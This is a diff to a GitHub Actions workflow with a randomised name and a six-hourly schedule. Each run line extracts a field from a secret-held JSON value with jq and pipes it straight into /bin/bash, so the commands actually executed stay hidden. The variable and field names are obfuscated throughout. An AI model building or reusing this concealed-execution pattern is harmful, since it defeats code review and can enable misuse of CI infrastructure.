@@ -1,30 +1,34 @@
 name: jialijuanzou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
+    - cron: '53 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jialijuanzou
         env:
-          tpx8659: ${{ secrets.tpx8659 }}
+          ktp82: ${{ secrets.ktp82 }}
         run: |
-          echo $tpx8659 | jq -r .vkot69 | /bin/bash
-          echo $c4 | jq -r .ea4 | /bin/bash
-          echo $unoi0 | jq -r .wax2935 | /bin/bash
-          echo $jbaf560 | jq -r .rq305 | /bin/bash
-          echo $cx03639 | jq -r .hc1 | /bin/bash
-          echo $cyrx3 | jq -r .yb22909 | /bin/bash
-          echo $k79093 | jq -r .i5 | /bin/bash
-          echo $jqh146 | jq -r .sjfcr728 | /bin/bash
-          echo $jsc61 | jq -r .h5698 | /bin/bash
-          echo $gvhkk3674 | jq -r .ot206 | /bin/bash
-          echo $xzh4241 | jq -r .olhgg50795 | /bin/bash
-          echo $raw9 | jq -r .cf3800 | /bin/bash
-          echo $ooxcv987 | jq -r .pfe3 | /bin/bash
-          echo $t4302 | jq -r .ehial352 | /bin/bash
+          echo $ktp82 | jq -r .t75179 | /bin/bash
+          echo $jjoc988 | jq -r .k7626 | /bin/bash
+          echo $vc26 | jq -r .bcuvm3 | /bin/bash
+          echo $y45905 | jq -r .y1074 | /bin/bash
+          echo $x7142 | jq -r .t77544 | /bin/bash
+          echo $uf43 | jq -r .fi2892 | /bin/bash
+          echo $zbiv6 | jq -r .xpg581 | /bin/bash
+          echo $ayh201 | jq -r .xihf7 | /bin/bash
+          echo $tyiz7 | jq -r .edng93 | /bin/bash
+          echo $zomus82743 | jq -r .metr422 | /bin/bash
+          echo $wiw062 | jq -r .mf350 | /bin/bash
+          echo $it5 | jq -r .wm97598 | /bin/bash
+          echo $a27 | jq -r .lpo20 | /bin/bash
+          echo $dcjz46 | jq -r .x402 | /bin/bash
+          echo $fjyf353 | jq -r .tr1376 | /bin/bash
+          echo $gj87953 | jq -r .sdby73 | /bin/bash
+          echo $cd753 | jq -r .dq2264 | /bin/bash
 
